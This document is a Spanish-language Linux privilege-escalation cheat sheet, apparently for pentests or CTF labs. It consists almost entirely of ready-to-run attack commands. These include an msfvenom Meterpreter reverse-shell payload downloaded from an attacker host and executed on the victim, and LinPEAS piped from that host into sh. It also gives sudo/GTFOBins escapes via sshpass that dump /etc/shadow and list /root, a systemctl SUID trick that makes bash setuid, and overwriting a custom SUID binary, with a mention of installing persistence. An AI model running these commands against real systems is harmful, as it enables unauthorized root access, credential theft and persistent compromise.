# PRIVESC LINUX — Enumeración, sudo y SUID

## Shell a Meterpreter
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o virus.elf
python3 -m http.server 80
# En víctima: wget http://<ATTACKER_IP>/virus.elf && chmod +x virus.elf && ./virus.elf
msfconsole -q -x "use multi/handler; set LHOST <LHOST>; set LPORT 4444; set PAYLOAD linux/x64/meterpreter/reverse_tcp; run"

# Upgrade shell → meterpreter
use shell_to_meterpreter
set session 1 && set lhost <LHOST> && run
```

## LinPEAS
```bash
python3 -m http.server 8080
wget http://<ATTACKER_IP>:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
# O en memoria:
curl -L http://<ATTACKER_IP>/linpeas.sh | sh
```

## sudo -l (GTFOBins)
Una vez con shell remoto (sshpass+ssh), el flujo metodológico es:
1) `sudo -l` para descubrir qué binarios puedes lanzar como otro usuario
   sin pedir contraseña (NOPASSWD).
2) Anotar el binario permitido. La ruta del binario (`/usr/bin/<X>`) la
   da el propio output de `sudo -l` — NO la asumas, léela.
3) Buscar el escape correspondiente en GTFOBins (https://gtfobins.github.io/).
   La pestaña relevante es **`Sudo`**.
4) Lanzar el escape por sshpass+ssh, NO interactivo (sin TTY).

```bash
# Paso 1 — enumerar
sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo -l
# El output mostrará algo del tipo:
#   User USER may run the following commands on HOST:
#     (ROOT_USER) NOPASSWD: /usr/bin/<BINARIO_VULNERABLE>
```

Paso 2 — explotación. Para evitar el infierno de comillas anidadas
(ssh + bash + intérprete), el patrón ROBUSTO es **pasar el código del
intérprete por STDIN** con `echo … | sshpass … ssh …`. Cero comillas
escapadas, una sola pasada de quoting. NUNCA uses paths absolutos del
binario `sudo` (ni `/usr/sbin/sudo` ni `/usr/bin/sudo`) — escribe SÓLO
`sudo`, está en el PATH del shell remoto.

```bash
# === Intérpretes (Ruby, Python, Perl, PHP, Node, Lua) ===
# Patrón general (el `-` final en ruby/python/php hace que lean script
# desde stdin). El primer comando confirma RCE con `id` (universal).

# --- Ruby ---
echo 'system("id")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/ruby
echo 'system("cat /etc/shadow")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/ruby
echo 'system("ls -la /root")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/ruby

# --- Python ---
echo 'import os; os.system("id")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/python3
echo 'import os; os.system("cat /etc/shadow")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/python3

# --- Perl ---
echo 'system("id")' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/perl

# --- PHP ---
echo '<?php system("id");' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/php

# --- Node ---
echo 'require("child_process").execSync("id",{stdio:"inherit"})' | sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/node

# === Otros binarios (no leen stdin) — patrón sin comillas, ssh une args ===
# find:
sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/find . -exec id ;
# vim:
sshpass -pPASS ssh -o StrictHostKeyChecking=no USER@<TARGET_IP> sudo /usr/bin/vim -c :!id -c :q!

# === Pagers (less, more, man) — REQUIEREN TTY interactivo, no aplican ===
```

Importante: el primer comando debería ser `id`. Si responde `uid=0(root)`
tienes shell de root y puedes pasar a leer ficheros sensibles, instalar
persistencia, etc. Si responde con tu uid normal, ese binario no funciona
como vector — busca otro entry en GTFOBins.

Buscar el escape exacto para cualquier binario: https://gtfobins.github.io/
Regla general: si NOPASSWD permite un intérprete o un binario que ejecuta
comandos arbitrarios (eval/system/exec), la escalada está servida.

## Binarios SUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null | grep '/bin'
```

### systemctl SUID → root
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF && /bin/systemctl enable --now $TF
bash -p
```

### SUID binario custom
```bash
file <FILE> && strings <FILE>
rm <BINARY> && cp /bin/bash <BINARY>
./<FILE>
```
